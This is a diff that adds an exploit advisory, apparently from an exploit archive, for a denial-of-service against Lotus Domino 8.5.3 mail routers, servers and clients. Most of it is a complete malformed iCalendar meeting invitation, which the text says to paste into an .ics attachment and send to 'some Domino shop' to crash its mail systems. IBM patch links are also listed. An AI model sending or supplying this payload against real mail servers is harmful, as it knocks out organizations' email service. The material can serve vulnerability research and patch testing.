@@ -1,0 +1,52 @@
+# Exploit Title: Lotus Domino SMTP router, EMAIL server and client DoS - all 3 may crash
+# Date: July 16, 2011
+# Author: None - looks like a malformed Kerio generated calendar invitation was the reason this was discovered -http://forums.kerio.com/index.php?t=msg&th=19863&start=0
+# Software Link: none - cut/paste the malformed meeting invitation show below, send into some Domino shop as a mime type text/calendar with a filename.ics 
+# Version: 8.5.3 and very likely all 7.x and 8.x
+# Tested on: W2K3, W2K8, XP running 8.5.3
+# CVE : none - but IBM has patches for this and other
+ items
+https://www-304.ibm.com/support/docview.wss?q1=vulnerability%20OR%20vulnerabilities&rs=0&uid=swg21461514&cs=utf-8?=en&loc=en_US&cc=us
+https://www-304.ibm.com/support/docview.wss?uid=swg21504183
+
+
+....................... cut/paste this to create a meeting.ics or hello.ics file as an
+ attachment..................................
+BEGIN:VCALENDAR
+PRODID:-//Bank-of-America.com/
+METHOD:REPLY
+VERSION:2.0
+X-VERSION-MSX:7.2
+BEGIN:VTIMEZONE
+TZID:GMT
+BEGIN:STANDARD
+DTSTART:19501029T020000
+TZOFFSETFROM:+0100
+TZOFFSETTO:+0000
+RRULE:FREQ=YEARLY;BYMONTH=10;BYDAY=-1SU;BYHOUR=2;BYMINUTE=0
+END:STANDARD
+BEGIN:DAYLIGHT
+DTSTART:19500326T020000
+TZOFFSETFROM:+0000
+TZOFFSETTO:+0100
+RRULE:FREQ=YEARLY;BYMONTH=3;BYDAY=-1SU;BYHOUR=2;BYMINUTE=0
+END:DAYLIGHT
+END:VTIMEZONE
+BEGIN:VEVENT
+DTEND:20110621T100000Z
+TRANSP:OPAQUE
+ORGANIZER;CN="PKim/BOA.com/":mailto:rjones_at_applegate.com
+UID:CBFF44ACA1Ff5A99802578B2004AD7A0-Lotus_Notes_Generated
+DTSTAMP:20110617T104325Z
+DESCRIPTION:Meeting invite - Today 18th 9-10am
+SEQUENCE:0
+SUMMARY:Once again 
+DTSTART:20110621T090000Z
+CREATED:20110617T104400Z
+X-MICROSOFT-CDO-BUSYSTATUS:BUSY
+CLASS:PUBLIC
+ATTENDEE;PARTSTAT=ACCEPTED;CN=RTBeinn_at_aclu.org;CUTYPE=INDIVIDUAL:mailto:meandyou_at_gmail.com 
+REQUEST-STATUS:2.0
+END:VEVENT
+END:VCALENDAR
+.........................................................................................
